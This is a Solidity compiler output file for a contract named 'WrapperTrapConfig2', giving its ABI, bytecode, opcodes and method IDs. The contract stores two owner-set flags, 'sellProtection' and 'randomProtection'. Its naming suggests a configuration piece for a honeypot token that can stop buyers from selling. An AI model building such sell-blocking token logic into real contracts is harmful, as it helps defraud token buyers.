{
  "contracts/WrapperTrap2.sol": {
    "WrapperTrapConfig2": {
      "abi": [
        {
          "inputs": [],
          "stateMutability": "nonpayable",
          "type": "constructor"
        },
        {
          "inputs": [],
          "name": "WrapperTrapConfig_config",
          "outputs": [
            {
              "internalType": "bool",
              "name": "",
              "type": "bool"
            },
            {
              "internalType": "bool",
              "name": "",
              "type": "bool"
            }
          ],
          "stateMutability": "view",
          "type": "function"
        },
        {
          "inputs": [
            {
              "internalType": "bool",
              "name": "_sellProtection",
              "type": "bool"
            },
            {
              "internalType": "bool",
              "name": "_randomProtection",
              "type": "bool"
            }
          ],
          "name": "WrapperTrap_config",
          "outputs": [],
          "stateMutability": "nonpayable",
          "type": "function"
        }
      ],
      "evm": {
        "bytecode": {
          "linkReferences": {},
          "object": "60a06040526000805461ffff1916905534801561001b57600080fd5b5032606081901b60805261011e61003b600039806089525061011e6000f3fe6080604052348015600f57600080fd5b506004361060325760003560e01c8063b976d623146037578063cc695c4814605d575b600080fd5b605b60048036036040811015604b57600080fd5b508035151590602001351515607e565b005b606360d5565b60408051921515835290151560208301528051918290030190f35b336001600160a01b037f0000000000000000000000000000000000000000000000000000000000000000161460b257600080fd5b6000805460ff19169215159290921761ff00191661010091151591909102179055565b60005460ff80821691610100900416909156fea2646970667358221220a0d86503847b797bd0ba5227b413b0e3fb4747b26379590eb7b7a2971980efec64736f6c63430007060033",
          "opcodes": "PUSH1 0xA0 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 SLOAD PUSH2 0xFFFF NOT AND SWAP1 SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x1B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP ORIGIN PUSH1 0x60 DUP2 SWAP1 SHL PUSH1 0x80 MSTORE PUSH2 0x11E PUSH2 0x3B PUSH1 0x0 CODECOPY DUP1 PUSH1 0x89 MSTORE POP PUSH2 0x11E PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x32 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xB976D623 EQ PUSH1 0x37 JUMPI DUP1 PUSH4 0xCC695C48 EQ PUSH1 0x5D JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x5B PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH1 0x4B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP DUP1 CALLDATALOAD ISZERO ISZERO SWAP1 PUSH1 0x20 ADD CALLDATALOAD ISZERO ISZERO PUSH1 0x7E JUMP JUMPDEST STOP JUMPDEST PUSH1 0x63 PUSH1 0xD5 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP3 ISZERO ISZERO DUP4 MSTORE SWAP1 ISZERO ISZERO PUSH1 0x20 DUP4 ADD MSTORE DUP1 MLOAD SWAP2 DUP3 SWAP1 SUB ADD SWAP1 RETURN JUMPDEST CALLER PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH32 0x0 AND EQ PUSH1 0xB2 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0xFF NOT AND SWAP3 ISZERO ISZERO SWAP3 SWAP1 SWAP3 OR PUSH2 0xFF00 NOT AND PUSH2 0x100 SWAP2 ISZERO ISZERO SWAP2 SWAP1 SWAP2 MUL OR SWAP1 SSTORE JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH1 0xFF DUP1 DUP3 AND SWAP2 PUSH2 0x100 SWAP1 DIV AND SWAP1 SWAP2 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 LOG0 0xD8 PUSH6 0x3847B797BD0 0xBA MSTORE 0x27 0xB4 SGT 0xB0 0xE3 0xFB SELFBALANCE SELFBALANCE 0xB2 PUSH4 0x79590EB7 0xB7 LOG2 SWAP8 NOT DUP1 0xEF 0xEC PUSH5 0x736F6C6343 STOP SMOD MOD STOP CALLER "
        },
        "methodIdentifiers": {
          "WrapperTrapConfig_config()": "cc695c48",
          "WrapperTrap_config(bool,bool)": "b976d623"
        }
      }
    }
  }
}